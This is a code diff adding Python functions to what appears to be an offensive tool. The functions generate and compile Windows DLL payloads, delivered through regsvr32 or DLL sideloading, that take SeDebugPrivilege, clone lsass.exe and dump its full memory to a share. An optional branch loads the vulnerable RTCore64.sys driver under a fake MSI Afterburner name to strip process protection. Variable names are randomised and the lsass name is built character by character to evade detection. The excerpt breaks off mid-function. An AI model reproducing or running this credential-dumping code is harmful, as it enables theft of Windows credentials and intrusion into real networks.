@@ -1872,6 +1872,558 @@ def gen_payload_exe_rtlcp(share_name, payload_name, drive_letter, runasppl):
     os.system('sudo chmod uog+rx /var/tmp/{}/{}.exe'.format(share_name, payload_name))
 
 
+def gen_payload_regsvr32_rtlcp(share_name, payload_name, drive_letter, runasppl):
+    load_RtlCreateProcessReflection = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    lib = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    proc = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    refl_creator = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    lpParam = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    args = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    ret = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    convertCharArrayToLPCWSTR = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    charArray = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    wString = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    hToken = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    tokenPriv = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    luid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    lsassPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    lsassHandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    snapshot = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    processEntry = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    processName = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    outFile = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    retd = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    info = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    res = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    compname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    compname_len = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    one = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    twp = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    lsass_processname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    processnamesd = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    szName = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    l = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    s = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    a = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    e = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    x = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    period = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    s1 = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    runninit = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    sAbout = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    runasppldllname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+
+    dll_payload = ''
+    dll_payload += '#include <windows.h>\n'
+    dll_payload += '#include <iostream>\n'
+    dll_payload += '#include <dbghelp.h>\n'
+    dll_payload += '#include <processsnapshot.h>\n'
+    dll_payload += '#include <tlhelp32.h>\n'
+    dll_payload += '#include <processthreadsapi.h>\n'
+    dll_payload += '#include <lmcons.h>\n'
+    if runasppl:
+        dll_payload += '#include <process.h>\n'
+        dll_payload += '#include <chrono>\n'
+        dll_payload += '#include <thread>\n'
+    dll_payload += '#include <sstream>\n'
+    dll_payload += '\n'
+    dll_payload += '#pragma comment (lib, "Dbghelp.lib")\n'
+    dll_payload += '#pragma comment (lib, "Advapi32.lib")\n'
+    dll_payload += '\n'
+    dll_payload += 'using namespace std;\n'
+    dll_payload += '#define USE_RTL_PROCESS_REFLECTION\n'
+    dll_payload += '\n'
+    dll_payload += '#ifndef RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED\n'
+    dll_payload += '#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED 0x00000001\n'
+    dll_payload += '#endif\n'
+    dll_payload += '\n'
+    dll_payload += '#ifndef RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES\n'
+    dll_payload += '#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002\n'
+    dll_payload += '#endif\n'
+    dll_payload += '\n'
+    dll_payload += '#ifndef RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE\n'
+    dll_payload += '#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE 0x00000004 // dont update synchronization objects\n'
+    dll_payload += '#endif\n'
+    dll_payload += '\n'
+    dll_payload += '#ifndef HPSS\n'
+    dll_payload += '#define HPSS HANDLE\n'
+    dll_payload += '#endif\n'
+    dll_payload += '\n'
+    dll_payload += 'const DWORD reflection_access = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE;\n'
+    dll_payload += '\n'
+    dll_payload += 'typedef HANDLE HPSS;\n'
+    dll_payload += '\n'
+    dll_payload += 'typedef struct  {\n'
+    dll_payload += '    HANDLE UniqueProcess;\n'
+    dll_payload += '    HANDLE UniqueThread;\n'
+    dll_payload += '} T_CLIENT_ID;\n'
+    dll_payload += '\n'
+    dll_payload += 'typedef struct\n'
+    dll_payload += '{\n'
+    dll_payload += '    HANDLE ReflectionProcessHandle;\n'
+    dll_payload += '    HANDLE ReflectionThreadHandle;\n'
+    dll_payload += '    T_CLIENT_ID ReflectionClientId;\n'
+    dll_payload += '} T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION;\n'
+    dll_payload += '\n'
+    dll_payload += '// Win >= 7\n'
+    dll_payload += 'NTSTATUS (NTAPI *_RtlCreateProcessReflection) (\n'
+    dll_payload += '    HANDLE ProcessHandle,\n'
+    dll_payload += '    ULONG Flags,\n'
+    dll_payload += '    PVOID StartRoutine,\n'
+    dll_payload += '    PVOID StartContext,\n'
+    dll_payload += '    HANDLE EventHandle,\n'
+    dll_payload += '    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION* ReflectionInformation\n'
+    dll_payload += ') = NULL;\n'
+    dll_payload += '\n'
+    dll_payload += '// Win >= 8.1\n'
+    dll_payload += '\n'
+    dll_payload += 'bool %s()\n' % (load_RtlCreateProcessReflection)
+    dll_payload += '{\n'
+    dll_payload += '    if (_RtlCreateProcessReflection == NULL) {\n'
+    dll_payload += '        HMODULE %s = LoadLibraryA("ntdll.dll");\n' % (lib)
+    dll_payload += '        if (!%s) return false;\n' % (lib)
+    dll_payload += ''
+    dll_payload += '        FARPROC %s = GetProcAddress(%s, "RtlCreateProcessReflection");\n' % (proc, lib)
+    dll_payload += '        if (!%s) return false;\n' % (proc)
+    dll_payload += ''
+    dll_payload += '        _RtlCreateProcessReflection = (NTSTATUS(NTAPI *) (\n'
+    dll_payload += '            HANDLE,\n'
+    dll_payload += '            ULONG,\n'
+    dll_payload += '            PVOID,\n'
+    dll_payload += '            PVOID,\n'
+    dll_payload += '            HANDLE,\n'
+    dll_payload += '            T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION*\n'
+    dll_payload += '        )) %s;\n' % (proc)
+    dll_payload += '\n'
+    dll_payload += '    }\n'
+    dll_payload += '    if (_RtlCreateProcessReflection == NULL) return false;\n'
+    dll_payload += '    return true;\n'
+    dll_payload += '}\n'
+    dll_payload += '\n'
+    dll_payload += 'typedef struct {\n'
+    dll_payload += '    HANDLE orig_hndl;\n'
+    dll_payload += '    HANDLE returned_hndl;\n'
+    dll_payload += '    DWORD returned_pid;\n'
+    dll_payload += '    bool is_ok;\n'
+    dll_payload += '} t_refl_args;\n'
+    dll_payload += '\n'
+    dll_payload += 'DWORD WINAPI %s(LPVOID %s)\n' % (refl_creator, lpParam)
+    dll_payload += '{\n'
+    dll_payload += '    t_refl_args *%s = static_cast<t_refl_args*>(%s);\n' % (args, lpParam)
+    dll_payload += '    if (!%s) {\n' % (args)
+    dll_payload += '        return !S_OK;\n'
+    dll_payload += '    }\n'
+    dll_payload += '    %s->is_ok = false;\n' % (args)
+    dll_payload += '\n'
+    dll_payload += '    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION %s = { 0 };\n' % (info)
+    dll_payload += '    NTSTATUS %s = _RtlCreateProcessReflection(%s->orig_hndl, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, NULL, NULL, NULL, &%s);\n' % (ret, args, info)
+    dll_payload += '    if (%s == S_OK) {\n' % (ret)
+    dll_payload += '        %s->is_ok = true;\n' % (args)
+    dll_payload += '        %s->returned_hndl = %s.ReflectionProcessHandle;\n' % (args, info)
+    dll_payload += '        %s->returned_pid = (DWORD)%s.ReflectionClientId.UniqueProcess;\n' % (args, info)
+    dll_payload += '    }\n'
+    dll_payload += '    else{\n'
+    dll_payload += '        printf("error: %d\\n", GetLastError());\n'
+    dll_payload += '    }\n'
+    dll_payload += '    return %s;\n' % (ret)
+    dll_payload += '}\n'
+    dll_payload += '\n'
+    dll_payload += 'wchar_t *%s(const char* %s)\n' % (convertCharArrayToLPCWSTR, charArray)
+    dll_payload += '{\n'
+    dll_payload += '    wchar_t* %s=new wchar_t[4096];\n' % (wString)
+    dll_payload += '    MultiByteToWideChar(CP_ACP, 0, %s, -1, %s, 4096);\n' % (charArray, wString)
+    dll_payload += '    return %s;\n' % (wString)
+    dll_payload += '}\n'
+    dll_payload += '\n'
+    if runasppl:
+        dll_payload += 'typedef void(WINAPI *%s)(int);\n' % (runninit)
+    dll_payload += '#define EXPORTED_METHOD extern "C" __declspec(dllexport)\n'
+    dll_payload += 'EXPORTED_METHOD\n'
+    dll_payload += 'bool DllRegisterServer(){\n'
+    dll_payload += '    return true;\n'
+    dll_payload += '}\n'
+    dll_payload += '\n'
+    dll_payload += 'EXPORTED_METHOD\n'
+    dll_payload += 'bool DllUnregisterServer(){\n'
+    dll_payload += '    return true;\n'
+    dll_payload += '}\n'
+    dll_payload += '\n'
+
+    dll_payload += 'EXPORTED_METHOD\n'
+    dll_payload += 'void DllInstall(bool flag, int ferihfe){\n'
+    if runasppl:
+        dll_payload += '    system("copy %s:\\\\RTCore64.sys C:\\\\Windows\\\\Temp");\n' % (drive_letter)
+        dll_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(2000));\n'
+        dll_payload += '    system("sc.exe create RTCore64 type=kernel start=auto binPath=C:\\\\Windows\\\\Temp\\\\RTCore64.sys DisplayName=\\\"Micro - Star MSI Afterburner\\\"");\n'
+        dll_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(1000));\n'
+        dll_payload += '    system("net start RTCore64");\n'
+        dll_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(3000));\n'
+        dll_payload += '    HMODULE %s = LoadLibrary(TEXT("%s.dll"));\n' % (s1, runasppldllname)
+        dll_payload += '    %s %s = (%s)GetProcAddress(%s, "freethecat");\n' % (runninit, sAbout, runninit, s1)
+        dll_payload += '    %s(_getpid());\n' % (sAbout)
+        dll_payload += '    FreeLibrary(%s);\n' % (s1)
+    dll_payload += '    HANDLE %s;\n' % (hToken)
+    dll_payload += '    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &%s);\n' % (hToken)
+    dll_payload += '    TOKEN_PRIVILEGES %s;\n' % (tokenPriv)
+    dll_payload += '    LUID %s;\n' % (luid)
+    dll_payload += '    LookupPrivilegeValue(NULL, "SeDebugPrivilege", &%s);\n' % (luid)
+    dll_payload += '    %s.PrivilegeCount = 1;\n' % (tokenPriv)
+    dll_payload += '    %s.Privileges[0].Luid = %s;\n' % (tokenPriv, luid)
+    dll_payload += '    %s.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n' % (tokenPriv)
+    dll_payload += '    AdjustTokenPrivileges(%s, FALSE, &%s, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL);\n' % (hToken, tokenPriv)
+    dll_payload += '\n'
+    dll_payload += '    DWORD %s = 0;\n' % (lsassPID)
+    dll_payload += '    HANDLE %s = NULL;\n' % (lsassHandle)
+    dll_payload += '    HANDLE %s = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n' % (snapshot)
+    dll_payload += '    PROCESSENTRY32 %s = {};\n' % (processEntry)
+    dll_payload += '    %s.dwSize = sizeof(PROCESSENTRY32);\n' % (processEntry)
+    dll_payload += '    LPCWSTR %s = L"";\n' % (processName)
+    dll_payload += '    string %s = "l";\n' % (l)
+    dll_payload += '    string %s = "s";\n' % (s)
+    dll_payload += '    string %s = "a";\n' % (a)
+    dll_payload += '    string %s = "e";\n' % (e)
+    dll_payload += '    string %s = "x";\n' % (x)
+    dll_payload += '    string %s = ".";\n' % (period)
+    dll_payload += '    string %s = %s + %s + %s +%s + %s + %s + %s + %s + %s;\n' % (lsass_processname, l, s, a, s, s, period, e, x, e)
+    dll_payload += '    std::wstring %s(%s.begin(), %s.end());\n' % (processnamesd, lsass_processname, lsass_processname)
+    dll_payload += '    const wchar_t* %s = %s.c_str();\n' % (szName, processnamesd)
+    dll_payload += '    if (Process32First(%s, &%s)) {\n' % (snapshot, processEntry)
+    dll_payload += '        while (_wcsicmp(%s, %s) != 0) {\n' % (processName, szName)
+    dll_payload += '            Process32Next(%s, &%s);\n' % (snapshot, processEntry)
+    dll_payload += '            %s = %s(%s.szExeFile);\n' % (processName, convertCharArrayToLPCWSTR, processEntry)
+    dll_payload += '            %s = %s.th32ProcessID;\n' % (lsassPID, processEntry)
+    dll_payload += '        }\n'
+    dll_payload += '    }\n'
+    dll_payload += ''
+    dll_payload += '    %s = OpenProcess(PROCESS_ALL_ACCESS, 0, %s);\n' % (lsassHandle, lsassPID)
+    dll_payload += ''
+    # should go drive_letter:\\\\hostname-ip.dmp adding the -ip part would be too much work so im not doing it soz
+    dll_payload += '    TCHAR %s[UNCLEN+1];\n' % (compname)
+    dll_payload += '    DWORD %s=UNCLEN+1;\n' % (compname_len)
+    dll_payload += '    GetComputerName((TCHAR*)%s,&%s);\n' % (compname, compname_len)
+
+    dll_payload += '    char %s[200];\n' % (res)
+    dll_payload += '    char *%s = "%s:\\\\";\n' % (one, drive_letter)
+    dll_payload += '    char *%s = ".dmp";\n' % (twp)
+    dll_payload += '    strcpy(%s, %s);\n' % (res, one)
+    dll_payload += '    strcat(%s, %s);\n' % (res, compname)
+    dll_payload += '    strcat(%s, %s);\n' % (res, twp)
+
+    dll_payload += '    HANDLE %s = CreateFile(%s, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n' % (outFile, res)
+    dll_payload += ''
+    dll_payload += '    %s();\n' % (load_RtlCreateProcessReflection)
+    dll_payload += '    t_refl_args %s = { 0 };\n' % (args)
+    dll_payload += '    %s.orig_hndl = %s;\n' % (args, lsassHandle)
+    dll_payload += '    DWORD %s = %s(&%s);\n' % (ret, refl_creator, args)
+    dll_payload += ''
+
+    dll_payload += '    DWORD %s = MiniDumpWriteDump(%s.returned_hndl, %s.returned_pid, %s, MiniDumpWithFullMemory, NULL,  NULL, NULL);\n' % (retd, args, args, outFile)
+    dll_payload += ''
+    dll_payload += '    CloseHandle(%s);\n' % (outFile)
+    dll_payload += '    TerminateProcess(%s.returned_hndl, 0);\n' % (args)
+    dll_payload += '    CloseHandle(%s.returned_hndl);\n' % (args)
+    dll_payload += '\n'
+    dll_payload += '}\n'
+    dll_payload += 'int main(){\n'
+    dll_payload += '    return 1;\n'
+    dll_payload += '}\n'
+
+    # share_name, payload_name, addresses_array, drive_letter
+    with open('/var/tmp/{}/pl.cpp'.format(share_name), 'w') as f:
+        f.write(dll_payload)
+        f.close()
+
+    if runasppl:
+        os.system('sudo cp {}/src/runasppldll /var/tmp/{}/{}.dll'.format(cwd, share_name, runasppldllname))
+        os.system('sudo cp {}/src/RTCore64.sys /var/tmp/{}/RTCore64.sys'.format(cwd, share_name))
+        with open('/var/tmp/{}/cleanup.bat'.format(share_name), 'w') as f:
+            f.write('net stop RTCore64\n')
+            f.write('sc delete RTCore64\n')
+            f.write(r'del C:\Windows\Temp\RTCore64.sys')
+            f.close()
+
+        os.system('sudo chmod uog+rwx /var/tmp/{}/{}.dll'.format(share_name, runasppldllname))
+        os.system('sudo chmod uog+rwx /var/tmp/{}/RTCore64.sys'.format(share_name))
+        os.system('sudo chmod uog+rwx /var/tmp/{}/cleanup.bat'.format(share_name))
+
+    os.system('sudo x86_64-w64-mingw32-g++ /var/tmp/{}/pl.cpp -fpermissive -Wwrite-strings -w -I {}/src/ -static -shared -o /var/tmp/{}/{}.dll -ldbghelp -lpsapi'.format(share_name, cwd, share_name, payload_name))
+    os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, payload_name))
+
+    return ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+
+
+def gen_payload_dllsideload_rtlcp(share_name, drive_letter, runasppl):
+    load_RtlCreateProcessReflection = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    lib = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    proc = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    refl_creator = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    lpParam = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    args = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    ret = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    convertCharArrayToLPCWSTR = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    charArray = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    wString = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    hToken = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    tokenPriv = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    luid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    lsassPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    lsassHandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    snapshot = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    processEntry = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    processName = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    outFile = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    retd = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    info = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    res = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    compname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    compname_len = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    one = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    twp = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    lsass_processname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    processnamesd = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    szName = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    l = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    s = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    a = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    e = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    x = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    period = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    s1 = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    runninit = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    sAbout = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+    runasppldllname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(15, 25)))
+
+    dll_payload = ''
+    dll_payload += '#include <windows.h>\n'
+    dll_payload += '#include <iostream>\n'
+    dll_payload += '#include <dbghelp.h>\n'
+    dll_payload += '#include <processsnapshot.h>\n'
+    dll_payload += '#include <tlhelp32.h>\n'
+    dll_payload += '#include <processthreadsapi.h>\n'
+    dll_payload += '#include <lmcons.h>\n'
+    if runasppl:
+        dll_payload += '#include <process.h>\n'
+        dll_payload += '#include <chrono>\n'
+        dll_payload += '#include <thread>\n'
+    dll_payload += '#include <sstream>\n'
+    dll_payload += '\n'
+    dll_payload += '#pragma comment (lib, "Dbghelp.lib")\n'
+    dll_payload += '#pragma comment (lib, "Advapi32.lib")\n'
+    dll_payload += '\n'
+    dll_payload += 'using namespace std;\n'
+    dll_payload += '#define USE_RTL_PROCESS_REFLECTION\n'
+    dll_payload += '\n'
+    dll_payload += '#ifndef RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED\n'
+    dll_payload += '#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED 0x00000001\n'
+    dll_payload += '#endif\n'
+    dll_payload += '\n'
+    dll_payload += '#ifndef RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES\n'
+    dll_payload += '#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES 0x00000002\n'
+    dll_payload += '#endif\n'
+    dll_payload += '\n'
+    dll_payload += '#ifndef RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE\n'
+    dll_payload += '#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE 0x00000004 // dont update synchronization objects\n'
+    dll_payload += '#endif\n'
+    dll_payload += '\n'
+    dll_payload += '#ifndef HPSS\n'
+    dll_payload += '#define HPSS HANDLE\n'
+    dll_payload += '#endif\n'
+    dll_payload += '\n'
+    dll_payload += 'const DWORD reflection_access = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE;\n'
+    dll_payload += '\n'
+    dll_payload += 'typedef HANDLE HPSS;\n'
+    dll_payload += '\n'
+    dll_payload += 'typedef struct  {\n'
+    dll_payload += '    HANDLE UniqueProcess;\n'
+    dll_payload += '    HANDLE UniqueThread;\n'
+    dll_payload += '} T_CLIENT_ID;\n'
+    dll_payload += '\n'
+    dll_payload += 'typedef struct\n'
+    dll_payload += '{\n'
+    dll_payload += '    HANDLE ReflectionProcessHandle;\n'
+    dll_payload += '    HANDLE ReflectionThreadHandle;\n'
+    dll_payload += '    T_CLIENT_ID ReflectionClientId;\n'
+    dll_payload += '} T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION;\n'
+    dll_payload += '\n'
+    dll_payload += '// Win >= 7\n'
+    dll_payload += 'NTSTATUS (NTAPI *_RtlCreateProcessReflection) (\n'
+    dll_payload += '    HANDLE ProcessHandle,\n'
+    dll_payload += '    ULONG Flags,\n'
+    dll_payload += '    PVOID StartRoutine,\n'
+    dll_payload += '    PVOID StartContext,\n'
+    dll_payload += '    HANDLE EventHandle,\n'
+    dll_payload += '    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION* ReflectionInformation\n'
+    dll_payload += ') = NULL;\n'
+    dll_payload += '\n'
+    dll_payload += '// Win >= 8.1\n'
+    dll_payload += '\n'
+    dll_payload += 'bool %s()\n' % (load_RtlCreateProcessReflection)
+    dll_payload += '{\n'
+    dll_payload += '    if (_RtlCreateProcessReflection == NULL) {\n'
+    dll_payload += '        HMODULE %s = LoadLibraryA("ntdll.dll");\n' % (lib)
+    dll_payload += '        if (!%s) return false;\n' % (lib)
+    dll_payload += ''
+    dll_payload += '        FARPROC %s = GetProcAddress(%s, "RtlCreateProcessReflection");\n' % (proc, lib)
+    dll_payload += '        if (!%s) return false;\n' % (proc)
+    dll_payload += ''
+    dll_payload += '        _RtlCreateProcessReflection = (NTSTATUS(NTAPI *) (\n'
+    dll_payload += '            HANDLE,\n'
+    dll_payload += '            ULONG,\n'
+    dll_payload += '            PVOID,\n'
+    dll_payload += '            PVOID,\n'
+    dll_payload += '            HANDLE,\n'
+    dll_payload += '            T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION*\n'
+    dll_payload += '        )) %s;\n' % (proc)
+    dll_payload += '\n'
+    dll_payload += '    }\n'
+    dll_payload += '    if (_RtlCreateProcessReflection == NULL) return false;\n'
+    dll_payload += '    return true;\n'
+    dll_payload += '}\n'
+    dll_payload += '\n'
+    dll_payload += 'typedef struct {\n'
+    dll_payload += '    HANDLE orig_hndl;\n'
+    dll_payload += '    HANDLE returned_hndl;\n'
+    dll_payload += '    DWORD returned_pid;\n'
+    dll_payload += '    bool is_ok;\n'
+    dll_payload += '} t_refl_args;\n'
+    dll_payload += '\n'
+    dll_payload += 'DWORD WINAPI %s(LPVOID %s)\n' % (refl_creator, lpParam)
+    dll_payload += '{\n'
+    dll_payload += '    t_refl_args *%s = static_cast<t_refl_args*>(%s);\n' % (args, lpParam)
+    dll_payload += '    if (!%s) {\n' % (args)
+    dll_payload += '        return !S_OK;\n'
+    dll_payload += '    }\n'
+    dll_payload += '    %s->is_ok = false;\n' % (args)
+    dll_payload += '\n'
+    dll_payload += '    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION %s = { 0 };\n' % (info)
+    dll_payload += '    NTSTATUS %s = _RtlCreateProcessReflection(%s->orig_hndl, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, NULL, NULL, NULL, &%s);\n' % (ret, args, info)
+    dll_payload += '    if (%s == S_OK) {\n' % (ret)
+    dll_payload += '        %s->is_ok = true;\n' % (args)
+    dll_payload += '        %s->returned_hndl = %s.ReflectionProcessHandle;\n' % (args, info)
+    dll_payload += '        %s->returned_pid = (DWORD)%s.ReflectionClientId.UniqueProcess;\n' % (args, info)
+    dll_payload += '    }\n'
+    dll_payload += '    else{\n'
+    dll_payload += '        printf("error: %d\\n", GetLastError());\n'
+    dll_payload += '    }\n'
+    dll_payload += '    return %s;\n' % (ret)
+    dll_payload += '}\n'
+    dll_payload += '\n'
+    dll_payload += 'wchar_t *%s(const char* %s)\n' % (convertCharArrayToLPCWSTR, charArray)
+    dll_payload += '{\n'
+    dll_payload += '    wchar_t* %s=new wchar_t[4096];\n' % (wString)
+    dll_payload += '    MultiByteToWideChar(CP_ACP, 0, %s, -1, %s, 4096);\n' % (charArray, wString)
+    dll_payload += '    return %s;\n' % (wString)
+    dll_payload += '}\n'
+    dll_payload += '\n'
+    if runasppl:
+        dll_payload += 'typedef void(WINAPI *%s)(int);\n' % (runninit)
+    dll_payload += '#define EXPORTED_METHOD extern "C" __declspec(dllexport)\n'
+    dll_payload += 'EXPORTED_METHOD\n'
+    dll_payload += 'void WICCreateImagingFactory_Proxy(bool flag){\n'
+    if runasppl:
+        dll_payload += '    system("copy %s:\\\\RTCore64.sys C:\\\\Windows\\\\Temp");\n' % (drive_letter)
+        dll_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(2000));\n'
+        dll_payload += '    system("sc.exe create RTCore64 type=kernel start=auto binPath=C:\\\\Windows\\\\Temp\\\\RTCore64.sys DisplayName=\\\"Micro - Star MSI Afterburner\\\"");\n'
+        dll_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(1000));\n'
+        dll_payload += '    system("net start RTCore64");\n'
+        dll_payload += '    std::this_thread::sleep_for(std::chrono::milliseconds(3000));\n'
+        dll_payload += '    HMODULE %s = LoadLibrary(TEXT("%s.dll"));\n' % (s1, runasppldllname)
+        dll_payload += '    %s %s = (%s)GetProcAddress(%s, "freethecat");\n' % (runninit, sAbout, runninit, s1)
+        dll_payload += '    %s(_getpid());\n' % (sAbout)
+        dll_payload += '    FreeLibrary(%s);\n' % (s1)
+    dll_payload += '    HANDLE %s;\n' % (hToken)
+    dll_payload += '    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &%s);\n' % (hToken)
+    dll_payload += '    TOKEN_PRIVILEGES %s;\n' % (tokenPriv)
+    dll_payload += '    LUID %s;\n' % (luid)
+    dll_payload += '    LookupPrivilegeValue(NULL, "SeDebugPrivilege", &%s);\n' % (luid)
+    dll_payload += '    %s.PrivilegeCount = 1;\n' % (tokenPriv)
+    dll_payload += '    %s.Privileges[0].Luid = %s;\n' % (tokenPriv, luid)
+    dll_payload += '    %s.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n' % (tokenPriv)
+    dll_payload += '    AdjustTokenPrivileges(%s, FALSE, &%s, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL);\n' % (hToken, tokenPriv)
+    dll_payload += '\n'
+    dll_payload += '    DWORD %s = 0;\n' % (lsassPID)
+    dll_payload += '    HANDLE %s = NULL;\n' % (lsassHandle)
+    dll_payload += '    HANDLE %s = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n' % (snapshot)
